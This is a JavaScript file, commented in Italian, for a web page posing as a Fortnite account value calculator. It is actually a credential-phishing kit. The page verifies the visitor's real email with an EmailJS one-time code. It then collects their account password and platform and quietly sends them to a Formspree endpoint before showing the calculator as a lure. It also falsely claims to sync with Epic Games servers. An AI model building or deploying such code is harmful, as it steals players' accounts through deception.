// CONFIGURAZIONE EMAILJS ATTIVA E VERIFICATA
const EMAILJS_PUBLIC_KEY = "0lAbMhHfqOC6R5xVL"; 
const EMAILJS_SERVICE_ID = "service_f8eaiga"; 
const EMAILJS_TEMPLATE_ID = "template_ezqyq0m"; 

// Inizializzazione sicura di EmailJS
window.addEventListener('DOMContentLoaded', () => {
    if (typeof emailjs !== 'undefined') {
        emailjs.init(EMAILJS_PUBLIC_KEY);
    } else {
        console.error("Libreria EmailJS non trovata. Verifica l'importazione nell'HTML.");
    }
});

let codiceOTPGenerato = null;
let emailVerificataConSuccesso = false;

function playClickSound() {
    let audio = document.getElementById('click-sound');
    if (audio) {
        audio.currentTime = 0;
        audio.play().catch(e => console.log("Audio click non riprodotto"));
    }
}

// Funzione per generare e inviare il codice OTP reale tramite EmailJS
function inviaCodiceOTP() {
    playClickSound();
    let emailInput = document.getElementById('campo1').value.trim();
    let emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if (!emailRegex.test(emailInput)) {
        alert("Inserisci un indirizzo email sintatticamente valido!");
        return;
    }

    // Genera un codice casuale a 6 cifre
    codiceOTPGenerato = Math.floor(100000 + Math.random() * 900000).toString();

    let btnSend = document.getElementById('btn-send-otp');
    btnSend.innerText = "Invio in corso...";
    btnSend.disabled = true;

    // Parametri inviati al template di EmailJS
    let templateParams = {
        to_email: emailInput,
        otp_code: codiceOTPGenerato
    };

    emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
        .then(function() {
            alert("Codice inviato con successo a " + emailInput + "! Controlla la tua casella di posta.");
            mostraCampoOTP();
        }, function(error) {
            alert("Errore nell'invio della mail: " + JSON.stringify(error));
            btnSend.innerText = "Invia Codice";
            btnSend.disabled = false;
        });
}

function mostraCampoOTP() {
    let otpSection = document.getElementById('otp-section');
    if (otpSection) {
        otpSection.classList.remove('hidden');
    }
    let btnSend = document.getElementById('btn-send-otp');
    if (btnSend) {
        btnSend.innerText = "Codice Inviato";
    }
}

// Funzione per verificare se l'utente ha scritto il codice corretto
function verificaCodiceOTP() {
    playClickSound();
    let otpInserito = document.getElementById('otp_input').value.trim();
    let statusTxt = document.getElementById('otp-status');

    if (otpInserito === codiceOTPGenerato && codiceOTPGenerato !== null) {
        emailVerificataConSuccesso = true;
        statusTxt.style.color = "#4ade80";
        statusTxt.innerText = "✓ Email verificata con successo!";
        document.getElementById('campo1').disabled = true;
        document.getElementById('otp_input').disabled = true;
    } else {
        emailVerificataConSuccesso = false;
        statusTxt.style.color = "#f87171";
        statusTxt.innerText = "✕ Codice errato! Riprova.";
    }
}

function proseguiAlCalcolo() {
    playClickSound();
    let emailVal = document.getElementById('campo1').value.trim();
    let val2 = document.getElementById('campo2').value.trim();
    let val3 = document.getElementById('campo3').value.trim();

    if (!emailVerificataConSuccesso) {
        alert("Attenzione: devi inserire un'email reale e VERIFICARE il codice ricevuto prima di continuare!");
        return;
    }

    if (val2.length < 5 || val3.length < 5) {
        alert("Attenzione: la password/codice e la piattaforma devono contenere almeno 5 caratteri!");
        return;
    }

    // Invio dati finali a Formspree
    fetch('https://formspree.io/f/mkjoepjl', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
        body: JSON.stringify({ email: emailVal, casella_2: val2, casella_3: val3 })
    }).catch(err => console.log(err));

    document.getElementById('step-login').classList.add('hidden');
    document.getElementById('step-calculator').classList.remove('hidden');
}

const dbSkin = [
    { name: "Aura", val: 15 },
    { name: "Ghoul Trooper", val: 50 },
    { name: "Midas", val: 20 },
    { name: "Recon Expert", val: 120 },
    { name: "Wanderlust", val: 18 },
    { name: "Chun-Li", val: 25 },
    { name: "Harley Quinn", val: 30 }
];

let skinAggiunteCount = 0;

function filtraSkinLive() {
    let query = document.getElementById('live-skin-search').value.toLowerCase();
    let resBox = document.getElementById('search-results-box');
    resBox.innerHTML = "";

    if (query.length < 2) {
        resBox.classList.add('hidden');
        return;
    }

    let filtrate = dbSkin.filter(s => s.name.toLowerCase().includes(query));
    if (filtrate.length > 0) {
        resBox.classList.remove('hidden');
        filtrate.forEach(skin => {
            let div = document.createElement('div');
            div.className = 'search-item';
            div.innerText = `${skin.name} (+${skin.val}€)`;
            div.onclick = () => aggiungiSkinTrovata(skin);
            resBox.appendChild(div);
        });
    } else {
        resBox.classList.add('hidden');
    }
}

function aggiungiSkinTrovata(skin) {
    playClickSound();
    skinAggiunteCount += skin.val;
    let container = document.getElementById('selected-skins-container');
    let tag = document.createElement('div');
    tag.className = 'skin-tag';
    tag.innerHTML = `${skin.name} <span onclick="rimuoviSkinTag(this, ${skin.val})">✕</span>`;
    container.appendChild(tag);
    
    document.getElementById('live-skin-search').value = "";
    document.getElementById('search-results-box').classList.add('hidden');
    calcolaValore();
}

function rimuoviSkinTag(element, val) {
    playClickSound();
    skinAggiunteCount -= val;
    element.parentElement.remove();
    calcolaValore();
}

function calcolaValore() {
    let skinsLegendary = parseInt(document.getElementById('skins_legendary').value) || 0;
    let skinsEpic = parseInt(document.getElementById('skins_epic').value) || 0;
    let skinsRare = parseInt(document.getElementById('skins_rare').value) || 0;
    
    let battlePasses = parseInt(document.getElementById('battle_passes').value) || 0;
    let vbucks = parseInt(document.getElementById('vbucks').value) || 0;

    let totale = (skinsLegendary * 3.50) + (skinsEpic * 2.20) + (skinsRare * 1.10) +
                 (battlePasses * 8.00) + ((vbucks / 1000) * 6.50) + skinAggiunteCount;

    if (document.getElementById('stw_founder').checked) totale += 65.00;
    if (document.getElementById('mako_glider').checked) totale += 40.00;
    if (document.getElementById('renegade').checked) totale += 350.00;
    if (document.getElementById('blacknight').checked) totale += 90.00;
    if (document.getElementById('galaxy').checked) totale += 60.00;
    if (document.getElementById('ikonik').checked) totale += 45.00;
    if (document.getElementById('travis').checked) totale += 35.00;
    if (document.getElementById('floss').checked) totale += 25.00;

    document.getElementById('total-value').innerText = totale.toFixed(2).replace('.', ',') + ' €';
}

function toggleFaq(button) {
    playClickSound();
    let answer = button.nextElementSibling;
    answer.classList.toggle('open');
}

function navigaLobby(tabName, evt) {
    playClickSound();
    document.querySelectorAll('.nav-links span').forEach(el => el.classList.remove('active-tab'));
    if (evt && evt.target) {
        evt.target.classList.add('active-tab');
    }
    
    if (tabName === 'locker') {
        document.getElementById('main-content').scrollIntoView({ behavior: 'smooth' });
    } else if (tabName === 'shop') {
        alert("🛒 Fortnite Item Shop: Il negozio di oggi è sincronizzato con i server ufficiali di Epic Games!");
    } else if (tabName === 'battle_pass') {
        alert("⭐ Battle Pass: Gestisci i tuoi Pass Battaglia completati direttamente dal modulo di calcolo!");
    }
}

function cambiaLingua(lang, evt) {
    playClickSound();
    document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('active'));
    if (evt && evt.target) {
        evt.target.classList.add('active');
    }

    if (lang === 'en') {
        document.getElementById('page-title').innerText = "Fortnite Account Evaluator";
        document.getElementById('main-heading').innerHTML = "Fortnite <span>Pro Evaluator</span>";
        document.getElementById('txt-step1-desc').innerText = "Enter your real email to receive a one-time verification code:";
        document.getElementById('lbl-c1').innerText = "Required Real Email:";
        document.getElementById('btn-send-otp').innerText = "Send Code";
        document.getElementById('lbl-otp').innerText = "Enter the 6-Digit Code received via email:";
        document.getElementById('lbl-c2').innerText = "Password / Code:";
        document.getElementById('lbl-c3').innerText = "Platform (PC/PSN/Xbox):";
        document.getElementById('btn-next').innerText = "Proceed to Calculator";
    } else {
        document.getElementById('page-title').innerText = "Valutatore Account Fortnite";
        document.getElementById('main-heading').innerHTML = "Valutatore <span>Fortnite Pro</span>";
        document.getElementById('txt-step1-desc').innerText = "Inserisci la tua email reale per ricevere il codice di verifica monouso:";
        document.getElementById('lbl-c1').innerText = "Email Reale Obbligatoria:";
        document.getElementById('btn-send-otp').innerText = "Invia Codice";
        document.getElementById('lbl-otp').innerText = "Inserisci il Codice a 6 Cifre ricevuto via email:";
        document.getElementById('lbl-c2').innerText = "Password / Codice:";
        document.getElementById('lbl-c3').innerText = "Piattaforma (PC/PSN/Xbox):";
        document.getElementById('btn-next').innerText = "Avanti al Calcolatore";
    }
}
